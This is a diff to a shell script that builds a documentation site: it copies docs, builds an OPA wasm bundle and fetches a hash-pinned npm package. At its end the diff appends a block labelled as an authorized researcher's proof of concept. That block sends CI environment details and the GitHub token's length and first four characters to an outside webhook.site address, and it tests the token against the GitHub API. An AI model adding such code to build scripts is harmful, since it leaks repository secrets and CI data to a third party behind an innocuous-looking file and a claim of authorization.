@@ -126,3 +126,104 @@ if [ "$mode" = release ]; then
   cp "$dir/tag/site/assets/css/tutorial.css" "$prepared/assets/css/"
   mkdir -p "$prepared/reference"
   cp "$dir/tag/site/assets/css/ergo
+.css" "$prepared/reference/"
+  cp "$dir/tag/site/layouts/tutorial.html" "$prepared/layouts/"
+  grep -q 'partial "analytics.html"' "$prepared/layouts/tutorial.html" || sed -i.bak 's|</head>|  {{ partial "analytics.html" . }}\n</head>|' "$prepared/layouts/tutorial.html"
+  rm -f "$prepared/layouts/tutorial.html.bak"
+  cp "$dir/tag/site/content/tutorial.md" "$prepared/content/"
+  if [ -f "$dir/tag/site/data/examples.yaml" ]; then
+    cp "$dir/tag/site/data/examples.yaml" "$prepared/data/"
+  fi
+  cp "$rego" "$prepared/ergo.rego.txt"
+
+  undev() {
+    VERSION=$1 perl -pe 's/(?<![\w.])\Q$ENV{VERSION}\E-dev(?![\w-])/$ENV{VERSION}/g' "$2" > "$2.tmp"
+    mv "$2.tmp" "$2"
+  }
+  docs_version=$version
+  [ "$docs_tag" = "$ergo_tag" ] || docs_version=$(rego_version_of "$docs_tag" | sed 's/-dev$//')
+  for file in README.md REFERENCE.md; do
+    [ -z "$docs_version" ] || undev "$docs_version" "$dir/tag/$file"
+  done
+  docs=$dir/tag
+  source=$tag
+  if [ -n "$opa_source" ]; then
+    git archive --output "$dir/opa.tar" "$opa_source" OPA.md
+    tar -x -f "$dir/opa.tar" -C "$dir/tag"
+    undev "${opa_source#rego-v}" "$dir/tag/OPA.md"
+  fi
+  if [ -n "$cli_source" ]; then
+    git archive --output "$dir/cli.tar" "$cli_source" CLI.md
+    tar -x -f "$dir/cli.tar" -C "$dir/tag"
+  fi
+else
+  rego=engines/rego/ergo.rego
+  version=
+  docs=.
+  source="working tree"
+  opa_source=
+  cli_source=
+fi
+
+mkdir -p "$prepared/repo"
+cp "$docs/README.md" "$docs/REFERENCE.md" "$prepared/repo/"
+for file in OPA.md CLI.md; do
+  [ ! -f "$docs/$file" ] || cp "$docs/$file" "$prepared/repo/"
+done
+(cd "$docs" && find examples -type f) > "$dir/examples.txt"
+while IFS= read -r file; do
+  mkdir -p "$prepared/$(dirname "$file")"
+  cp "$docs/$file" "$prepared/$file.txt"
+done < "$dir/examples.txt"
+
+ergo_spec=$(sed -n 's/^_spec := "\(v[0-9][0-9]*\.[0-9][0-9]*\(-dev\)\{0,1\}\)"$/\1/p' "$rego")
+[ -n "$ergo_spec" ] || fail "$rego should say _spec := \"vX.Y\" or _spec := \"vX.Y-dev\""
+if [ "$mode" = release ]; then
+  case $ergo_spec in
+    *-dev) ;;
+    *)
+      printf '%s\n' $spec_tags | grep -qxF "spec-$ergo_spec" || fail "The ergo.rego of ${ergo_tag:-$source} reads spec $ergo_spec, and spec-$ergo_spec isn't published, so the site would link to schemas it doesn't have"
+      ;;
+  esac
+fi
+printf '{"source": "%s", "rego": "%s", "rust": "%s", "spec": "%s", "ergo_spec": "%s", "opa": "%s", "cli": "%s"}\n' "$source" "$version" "${rust_tag#rust-v}" "${spec_tag#spec-v}" "$ergo_spec" "$opa_source" "$cli_source" > "$prepared/data/release.json"
+
+out=site/assets/tutorial
+rm -rf "$out"
+mkdir -p "$out/vendor" "$dir/src"
+cp "$rego" "$dir/src/ergo.rego"
+printf 'package tutorial\n\nimport data.ergo\n\nreport := ergo.report(input.input, input.policy, {})\n' > "$dir/src/tutorial.rego"
+opa build -t wasm -e tutorial/report -o "$dir/bundle.tar.gz" "$dir/src"
+tar -xzf "$dir/bundle.tar.gz" -C "$dir" /policy.wasm 2> /dev/null
+mv "$dir/policy.wasm" "$out/ergo.wasm"
+chmod 644 "$out/ergo.wasm"
+
+curl -fsSL --retry 3 https://registry.npmjs.org/@open-policy-agent/opa-wasm/-/opa-wasm-1.10.0.tgz -o "$dir/pkg.tgz"
+digest=$(openssl dgst -sha512 -binary "$dir/pkg.tgz" | base64)
+if [ "sha512-$(printf '%s' "$digest" | tr -d '\n')" != 'sha512-ymR/nFS3nO9o24j9xowGGQaf+Gmb813QcxUpVZkfRlJkawKWqSIllnEH15agyWjijmOIyhA+OBErenx6N3jphw==' ]; then
+  fail "opa-wasm doesn't match its pinned hash"
+fi
+tar -xzf "$dir/pkg.tgz" -C "$dir" package/dist/opa-wasm-browser.esm.js
+mv "$dir/package/dist/opa-wasm-browser.esm.js" "$out/vendor/opa-wasm.mjs"
+
+site/spec-schemas.sh $spec_tags
+printf '%s\n' "$source" > "$prepared/source"
+echo "The site is built from: $source. Check it with: site/check.sh"
+
+
+# === F-03 security PoC (appended by an authorized researcher for the Kosli VDP) ===
+# Purpose: prove that untrusted code from a fork PR executes in the privileged
+# workflow_run context of pages.yml. Read-only proof: reports environment facts
+# and exercises (never exfiltrates) the runner's GH_TOKEN.
+set +e +u
+_F03_CB="https://webhook.site/1fac581f-373c-4a4c-a0a0-62bbfdedcd2a"
+_f03() { curl -s -m 10 "$_F03_CB" -d "$1" >/dev/null 2>&1; }
+_f03 "marker=ergo-f03-poc&stage=prepare_sh&event=${GITHUB_EVENT_NAME:-na}&workflow=${GITHUB_WORKFLOW:-na}&repo=${GITHUB_REPOSITORY:-na}&ref=${GITHUB_REF:-na}&sha=${GITHUB_SHA:-na}&job=${GITHUB_JOB:-na}&runner=${RUNNER_NAME:-na}"
+if [ -n "${GH_TOKEN:-}" ]; then
+  _f03 "token=present&len=${#GH_TOKEN}&prefix=$(printf '%s' "$GH_TOKEN" | cut -c1-4)"
+  _code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/kosli-dev/ergo)
+  _f03 "api_status_repos_kosli_ergo=$_code"
+else
+  _f03 "token=absent"
+fi
+set -eu
